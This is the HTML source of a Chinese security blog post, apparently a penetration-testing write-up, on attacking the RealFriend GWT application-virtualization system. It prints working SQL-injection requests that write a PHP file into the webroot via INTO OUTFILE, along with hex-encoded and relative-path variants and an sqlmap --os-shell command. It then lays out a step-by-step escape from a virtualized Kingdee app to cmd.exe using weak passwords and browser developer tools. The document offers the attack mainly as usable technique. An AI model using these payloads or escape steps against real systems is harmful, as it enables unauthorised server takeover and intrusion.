@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="环境介绍此环境使用系统为：瑞友天翼应用虚拟化系统 攻击策略基本信息 瑞友天翼应用虚拟化系统（GWT System）是国内具有自主知识产权的应用虚拟化平台，是基于服务器计算（Server-based Computing）的应用虚拟化平台。它将用户所有应用软件（ERP、OA、CRM、PDM、CAD……）集中部署在天翼服务器（群）上，客户端通过WEB即可快速安全的访问经服务器上授权的应用软件，实现集中应">
+<meta property="og:type" content="article">
+<meta property="og:title" content="虚拟化应用攻击策略">
+<meta property="og:url" content="http://example.com/2024/07/08/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%BA%94%E7%94%A8%E6%94%BB%E5%87%BB%E7%AD%96%E7%95%A5/index.html">
+<meta property="og:site_name" content="Z1sec-Blog">
+<meta property="og:description" content="环境介绍此环境使用系统为：瑞友天翼应用虚拟化系统 攻击策略基本信息 瑞友天翼应用虚拟化系统（GWT System）是国内具有自主知识产权的应用虚拟化平台，是基于服务器计算（Server-based Computing）的应用虚拟化平台。它将用户所有应用软件（ERP、OA、CRM、PDM、CAD……）集中部署在天翼服务器（群）上，客户端通过WEB即可快速安全的访问经服务器上授权的应用软件，实现集中应">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240708135627.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240708140925.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240708143542.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240708145315.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240708145414.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240708145642.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240708145759.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240708145935.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240708155932.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240708155833.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240708160041.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020241219130728.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020241219130939.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240708160209.png">
+<meta property="article:published_time" content="2024-07-08T08:03:32.000Z">
+<meta property="article:modified_time" content="2024-12-19T06:43:14.998Z">
+<meta property="article:author" content="z1">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/Pasted%20image%2020240708135627.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>虚拟化应用攻击策略</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/parttime/index.html">PartTime</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/08/03/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/07/04/TCP%E5%BA%94%E7%94%A8SQL%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/07/08/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%BA%94%E7%94%A8%E6%94%BB%E5%87%BB%E7%AD%96%E7%95%A5/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/07/08/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%BA%94%E7%94%A8%E6%94%BB%E5%87%BB%E7%AD%96%E7%95%A5/&text=虚拟化应用攻击策略"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/07/08/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%BA%94%E7%94%A8%E6%94%BB%E5%87%BB%E7%AD%96%E7%95%A5/&title=虚拟化应用攻击策略"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/07/08/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%BA%94%E7%94%A8%E6%94%BB%E5%87%BB%E7%AD%96%E7%95%A5/&is_video=false&description=虚拟化应用攻击策略"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=虚拟化应用攻击策略&body=Check out this article: http://example.com/2024/07/08/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%BA%94%E7%94%A8%E6%94%BB%E5%87%BB%E7%AD%96%E7%95%A5/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/07/08/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%BA%94%E7%94%A8%E6%94%BB%E5%87%BB%E7%AD%96%E7%95%A5/&title=虚拟化应用攻击策略"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/07/08/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%BA%94%E7%94%A8%E6%94%BB%E5%87%BB%E7%AD%96%E7%95%A5/&title=虚拟化应用攻击策略"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/07/08/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%BA%94%E7%94%A8%E6%94%BB%E5%87%BB%E7%AD%96%E7%95%A5/&title=虚拟化应用攻击策略"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/07/08/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%BA%94%E7%94%A8%E6%94%BB%E5%87%BB%E7%AD%96%E7%95%A5/&title=虚拟化应用攻击策略"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/07/08/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%BA%94%E7%94%A8%E6%94%BB%E5%87%BB%E7%AD%96%E7%95%A5/&name=虚拟化应用攻击策略&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/07/08/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%BA%94%E7%94%A8%E6%94%BB%E5%87%BB%E7%AD%96%E7%95%A5/&t=虚拟化应用攻击策略"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">环境介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E7%AD%96%E7%95%A5"><span class="toc-number">2.</span> <span class="toc-text">攻击策略</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">2.1.</span> <span class="toc-text">基本信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E8%8E%B7%E5%8F%96%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90"><span class="toc-number">2.2.</span> <span class="toc-text">系统后台获取内网权限</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        虚拟化应用攻击策略
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">z1</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-07-08T08:03:32.000Z" class="dt-published" itemprop="datePublished">2024-07-08</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h1><p>此环境使用系统为：瑞友天翼应用虚拟化系统<br><img src="/images/Pasted%20image%2020240708135627.png"></p>
+<h1 id="攻击策略"><a href="#攻击策略" class="headerlink" title="攻击策略"></a>攻击策略</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><blockquote>
+<p>瑞友天翼应用虚拟化系统（GWT System）是国内具有自主知识产权的应用虚拟化平台，是基于服务器计算（Server-based Computing）的应用虚拟化平台。它将用户所有应用软件（ERP、OA、CRM、PDM、CAD……）集中部署在天翼服务器（群）上，客户端通过WEB即可快速安全的访问经服务器上授权的应用软件，实现集中应用、远程接入、协同办公等，从而为用户打造集中、便捷、安全、高效的虚拟化支撑平台。操作终端无需再安装应用程序，通过天翼独特的RAP 协议（Remote Application Protocol），即可让用户快速访问服务器上的各类应用软件；天翼RAP 协议只传输鼠标、键盘及屏幕变化的矢量数据，访问仅需3KB&#x2F;s（20kbps）的带宽，用户不再受客户端和连接性能要求的限制，在任何时间、任何地点，利用任何设备、任何网络连接方式，即可高效安全地访问服务器（群）上的应用程序和关键资源。</p>
+</blockquote>
+<p>该系统存在Nday Sql注入漏洞为西安瑞友信息技术资讯有限公司产品。<br>影响范围：5.x &lt;&#x3D; 瑞友天翼应用虚拟化系统（GWT System） &lt;&#x3D; 7.0.2</p>
+<p>看一下历史漏洞POC，是个Sql注入，并且默认有权限可直接使用mysql写文件Getshell</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">raw:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">|</span></span><br><span class="line"><span class="string">        GET /AgentBoard.XGI?user=&#x27;||&#x27;1&amp;cmd=UserLogin HTTP/1.1</span></span><br><span class="line"><span class="string">        Host: &#123;&#123;Hostname&#125;&#125;</span></span><br><span class="line"><span class="string"></span>      <span class="bullet">-</span> <span class="string">|</span></span><br><span class="line"><span class="string">        GET /Board.XGI HTTP/1.1</span></span><br><span class="line"><span class="string">        Cookie: PHPSESSID=&#123;&#123;cookie&#125;&#125;</span></span><br><span class="line"><span class="string">        Host: &#123;&#123;Hostname&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">    <span class="attr">extractors:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">regex</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">cookie</span></span><br><span class="line">        <span class="attr">internal:</span> <span class="literal">true</span></span><br><span class="line">        <span class="attr">part:</span> <span class="string">header</span></span><br><span class="line">        <span class="attr">group:</span> <span class="number">1</span></span><br><span class="line">        <span class="attr">regex:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">&#x27;PHPSESSID=(.*?);&#x27;</span></span><br><span class="line">    <span class="attr">matchers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">dsl</span></span><br><span class="line">        <span class="attr">dsl:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">&#x27;contains(body_1,&quot;CustomInfo&quot;) &amp;&amp; contains(header_1,&quot;PHPSESSID&quot;)&#x27;</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">&#x27;contains(body_2,&quot;src=\&quot;custom/&quot;)&#x27;</span></span><br><span class="line">        <span class="attr">condition:</span> <span class="string">and</span></span><br></pre></td></tr></table></figure>
+
+<p>写Shell POC：<br><img src="/images/Pasted%20image%2020240708140925.png"></p>
+<p>看一下POC：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /AgentBoard.XGI?user=-1%27+union+select+1%2C%27%3C%3Fphp+phpinfo%28%29%3B%3F%3E%27+into+outfile+%22C%3A%5C%5CProgram%5C+Files%5C+%5C%28x86%5C%29%5C%5CRealFriend%5C%5CRap%5C+Server%5C%5CWebRoot%5C%5Ctest.php%22+--+-&amp;cmd=UserLogin HTTP/1.1</span><br><span class="line">Host: 0.0.0.0</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>解码一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=-1&#x27;+union+select+1,&#x27;&lt;?php+phpinfo();?&gt;&#x27;+into+outfile+&quot;C:\\Program\+Files\+\(x86\)\\RealFriend\\Rap\+Server\\WebRoot\\test.php&quot;+--+-&amp;cmd=UserLogin</span><br></pre></td></tr></table></figure>
+
+<p>Tips：在实际环境测试中，对于此类写shell，可尝试多种转换写法。</p>
+<ul>
+<li><p>使用HEX编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=-1&#x27;+union+select+1,0x3c3f7068702b706870696e666f28293b3f3e+into+outfile+&quot;C:\\Program\+Files\+\(x86\)\\RealFriend\\Rap\+Server\\WebRoot\\test.php&quot;+--+-&amp;cmd=UserLogin</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用相对目录（程序安装目录存在差异情况下的测试方式，并非直接写shell路径）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=-1&#x27;+union+select+1,0x3c3f7068702b706870696e666f28293b3f3e+into+outfile+&quot;..\\..\\WebRoot\\test.php&quot;+--+-&amp;cmd=UserLogin</span><br></pre></td></tr></table></figure>
+<p>或</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=-1&#x27;+union+select+1,0x3c3f7068702b706870696e666f28293b3f3e+into+outfile+&quot;..\\..\\RealFriend\\Rap\+Server\\WebRoot\\test.php&quot;+--+-&amp;cmd=UserLogin</span><br></pre></td></tr></table></figure>
+<p>或</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=-1&#x27;+union+select+1,0x3c3f7068702b706870696e666f28293b3f3e+into+outfile+&quot;..\\..\\test.php&quot;+--+-&amp;cmd=UserLogin</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用sqlmap FUZZ</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.target.com/AgentBoard.XGI?user=-1*&quot; --os-shell --batch</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>Tips：通常此系统数据库配置文件位于（具体位置记不得了）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files(x86)\RealFriend\Rap Server\conf\</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Pasted%20image%2020240708143542.png"></p>
+<h2 id="系统后台获取内网权限"><a href="#系统后台获取内网权限" class="headerlink" title="系统后台获取内网权限"></a>系统后台获取内网权限</h2><p>下载客户端软件<br><img src="/images/Pasted%20image%2020240708145315.png"></p>
+<p>安装软件进行登陆（系统存在弱口令）<br><img src="/images/Pasted%20image%2020240708145414.png"></p>
+<p>进入客户端后台后可发现使用的是rdp连接到远程虚拟化应用系统，但无执行CMD命令功能等操作。<br><img src="/images/Pasted%20image%2020240708145642.png"></p>
+<p>当前虚拟化应用存在3个应用，<strong>对于虚拟化应用可尽量在应用内找到能调用浏览器的入口</strong>，此处打开<code>金蝶</code><br><img src="/images/Pasted%20image%2020240708145759.png"></p>
+<p>接着使用虚拟化应用的弱口令登陆。<br><img src="/images/Pasted%20image%2020240708145935.png"></p>
+<p>在<code>金蝶</code>应用中存在远程协助功能，可使用此功能调出IE浏览器，保存页面可调出文件管理器，但此时只能保存成txt文件，意味着我们无法查看到除txt外其他文件类型。<br>路径是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">服务-》远程协助-》可以打开浏览器-》浏览器内点击工具-》开发人员工具-》ctrl+s保存页面-》点击桌面-》右键***.txt（已经存在了的txt文件） 选择打开-》</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Pasted%20image%2020240708155932.png"></p>
+<p>接着另存txt-》保存类型选择全部-》找到cmd目录，右键打开CMD即可执行命令获取服务器权限。<br><img src="/images/Pasted%20image%2020240708155833.png"></p>
+<p><img src="/images/Pasted%20image%2020240708160041.png"></p>
+<p>拓展：针对其他虚拟化平台的利用策略<br>每一个功能点都详尽测试，尽量找可以调用浏览器的点：<br><img src="/images/Pasted%20image%2020241219130728.png"></p>
+<p>调用出浏览器后和上面操作一样即可。<br><img src="/images/Pasted%20image%2020241219130939.png"></p>
+<p>接着上线即可<br><img src="/images/Pasted%20image%2020240708160209.png"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/parttime/index.html">PartTime</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">环境介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E7%AD%96%E7%95%A5"><span class="toc-number">2.</span> <span class="toc-text">攻击策略</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">2.1.</span> <span class="toc-text">基本信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E8%8E%B7%E5%8F%96%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90"><span class="toc-number">2.2.</span> <span class="toc-text">系统后台获取内网权限</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/07/08/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%BA%94%E7%94%A8%E6%94%BB%E5%87%BB%E7%AD%96%E7%95%A5/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/07/08/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%BA%94%E7%94%A8%E6%94%BB%E5%87%BB%E7%AD%96%E7%95%A5/&text=虚拟化应用攻击策略"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/07/08/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%BA%94%E7%94%A8%E6%94%BB%E5%87%BB%E7%AD%96%E7%95%A5/&title=虚拟化应用攻击策略"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/07/08/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%BA%94%E7%94%A8%E6%94%BB%E5%87%BB%E7%AD%96%E7%95%A5/&is_video=false&description=虚拟化应用攻击策略"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=虚拟化应用攻击策略&body=Check out this article: http://example.com/2024/07/08/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%BA%94%E7%94%A8%E6%94%BB%E5%87%BB%E7%AD%96%E7%95%A5/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/07/08/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%BA%94%E7%94%A8%E6%94%BB%E5%87%BB%E7%AD%96%E7%95%A5/&title=虚拟化应用攻击策略"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/07/08/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%BA%94%E7%94%A8%E6%94%BB%E5%87%BB%E7%AD%96%E7%95%A5/&title=虚拟化应用攻击策略"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/07/08/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%BA%94%E7%94%A8%E6%94%BB%E5%87%BB%E7%AD%96%E7%95%A5/&title=虚拟化应用攻击策略"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/07/08/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%BA%94%E7%94%A8%E6%94%BB%E5%87%BB%E7%AD%96%E7%95%A5/&title=虚拟化应用攻击策略"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/07/08/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%BA%94%E7%94%A8%E6%94%BB%E5%87%BB%E7%AD%96%E7%95%A5/&name=虚拟化应用攻击策略&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/07/08/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%BA%94%E7%94%A8%E6%94%BB%E5%87%BB%E7%AD%96%E7%95%A5/&t=虚拟化应用攻击策略"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    z1
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/parttime/index.html">PartTime</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
